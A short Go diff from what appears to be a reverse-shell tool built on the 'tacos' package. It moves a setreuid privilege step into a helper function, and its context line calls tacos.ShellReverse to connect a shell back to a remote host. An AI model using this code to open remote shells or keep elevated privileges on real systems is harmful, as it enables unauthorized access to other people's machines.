@@ -6,7 +6,6 @@ import (
 	"os"
 	"runtime"
 	"strings"
-	"syscall"
 
 	"github.com/ariary/tacos/pkg/tacos"
 )
@@ -53,8 +52,7 @@ func main() {
 	}
 
 	if setreuid {
-		euid := syscall.Geteuid()
-		syscall.Setreuid(euid, euid)
+		applySetreuid()
 	}
 
 	tacos.ShellReverse(Remote, shell, timeout, maxRetries)
